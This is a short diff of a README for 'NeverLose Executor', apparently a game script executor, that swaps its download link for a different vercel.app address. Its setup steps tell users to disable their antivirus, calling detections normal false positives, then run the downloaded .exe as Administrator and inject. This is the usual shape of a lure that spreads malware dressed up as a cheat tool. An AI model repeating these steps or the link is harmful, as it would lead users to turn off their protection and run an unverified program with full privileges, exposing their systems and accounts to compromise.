@@ -35,7 +35,7 @@ NeverLose is not just another executor. It is a premium tool designed for power 
 
 ## 📥 Getting Started
 
-1.  **Download:** [Download NeverLose Executor](https://vercel.app/NeverLoseExecutor/Download) 📥
+1.  **Download:** [Download NeverLose Executor](https://neverlose-two.vercel.app) 📥
 2.  **Disable Antivirus:** False positives are normal for executors.
 3.  **Launch:** Open the `.exe` as Administrator.
 4.  **Inject:** Click the syringe icon and start your scripts!
